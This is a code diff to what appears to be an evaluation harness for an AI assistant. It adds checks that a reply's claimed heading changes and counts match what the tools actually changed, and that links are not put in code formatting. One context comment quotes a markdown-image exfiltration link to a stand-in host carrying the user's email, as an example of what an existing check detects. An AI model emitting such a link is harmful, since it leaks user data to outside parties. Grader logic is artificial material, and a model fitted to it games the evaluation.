@@ -516,6 +516,75 @@ final class ReplyChecks
      * ![x](https://collector.invalid/?d=EMAIL). Quoting the content's URL unchanged is not a leak, and a host no tool
      * returned is no_invented_hosts's business. Written `no_untrusted_links: true`, or `{primary: true}`.
      */
+    /**
+     * reply_matches_changed (P3.7-2, P3.11-1's proposal), run on every expect block like no_false_success: when a
+     * successful write's result says what it changed in one line (`changed`, e.g. "Changed 2 headings to <h2>: …"),
+     * the heading levels the reply says things became and the counts it gives must match those lines. Primary: a
+     * mismatch is the reply misreporting a change (scenario 05 in P3.3-1: bold paragraphs became h3, the reply said
+     * the h3 headings became h2). A turn with no `changed` line passes.
+     */
+    public static function replyMatchesChanged(CheckContext $c): CheckResult
+    {
+        $tags = [];
+        $counts = [];
+        foreach ($c->toolCalls as $call) {
+            if (!$call['ok'] || !ToolCall::isWrite($call['name'])) {
+                continue;
+            }
+            $decoded = json_decode((string) $call['result'], true);
+            $line = is_array($decoded) && is_string($decoded['changed'] ?? null) ? $decoded['changed'] : null;
+            // A recorded result is shortened, so it may not decode; its `changed` line comes first.
+            if ($decoded === null && preg_match('/"changed":"((?:[^"\\\\]|\\\\.)*)"/', (string) $call['result'], $m) === 1) {
+                $line = (string) json_decode('"' . $m[1] . '"');
+            }
+            if ($line === null || (($decoded['ok'] ?? true) === false)) {
+                continue;
+            }
+            if (preg_match_all('/<(h[1-6])>/i', $line, $m) > 0) {
+                array_push($tags, ...array_map('strtolower', $m[1]));
+            }
+            if (preg_match('/^\D*(\d+)/', $line, $m) === 1) {
+                $counts[] = (int) $m[1];
+            }
+        }
+        if ($tags === [] && $counts === []) {
+            return new CheckResult(CheckResult::REPLY, 'reply_matches_changed', true, '', true);
+        }
+
+        $problems = [];
+        if (preg_match_all('/\b(?:in)?to\s*[`<]*\s*(h[1-6])\b/i', $c->reply, $m) > 0) {
+            foreach (array_unique(array_map('strtolower', $m[1])) as $claimed) {
+                if (!in_array($claimed, $tags, true)) {
+                    $problems[] = "the reply says they became {$claimed}; the tools changed them to " . implode(', ', array_unique($tags));
+                }
+            }
+        }
+        $numbers = array_flip(self::NUMBER_WORDS) + ['both' => 2];
+        $allowed = [...$counts, array_sum($counts)];
+        if (preg_match_all('/\b(\d+|' . implode('|', array_keys($numbers)) . ')\s+(?:[`<]*h[1-6][`>]*\s+)?(?:bold\s+)?(?:headings?|paragraphs?)\b/i', $c->reply, $m) > 0) {
+            foreach ($m[1] as $said) {
+                $n = ctype_digit($said) ? (int) $said : $numbers[strtolower($said)];
+                if ($n > 1 && !in_array($n, $allowed, true)) {
+                    $problems[] = "the reply says {$said}; the tools changed " . implode(' + ', $counts);
+                }
+            }
+        }
+
+        return new CheckResult(CheckResult::REPLY, 'reply_matches_changed', $problems === [], implode('; ', array_unique($problems)), true);
+    }
+
+    /**
+     * links_not_in_code (P3.7-2, B-REP-1 (b)), run on every expect block: a URL or a site path is never in code
+     * formatting, where the panel shows it as text, not a link. Secondary: the link is still in the reply.
+     */
+    public static function linksNotInCode(CheckContext $c): CheckResult
+    {
+        preg_match_all('~`((?:https?://|/)[^`\s]*)`~i', $c->reply, $m);
+        $inCode = array_values(array_filter($m[1], static fn (string $s): bool => !str_starts_with($s, '/') || preg_match('~^/[\w-]+(/[\w.-]*)*$~', $s) === 1));
+
+        return new CheckResult(CheckResult::REPLY, 'links_not_in_code', $inCode === [], $inCode === [] ? '' : 'in code formatting: ' . implode(', ', $inCode), false);
+    }
+
     private static function noUntrustedLinks(bool $primary, CheckContext $c): CheckResult
     {
         if (stripos($c->reply, 'http') === false) {
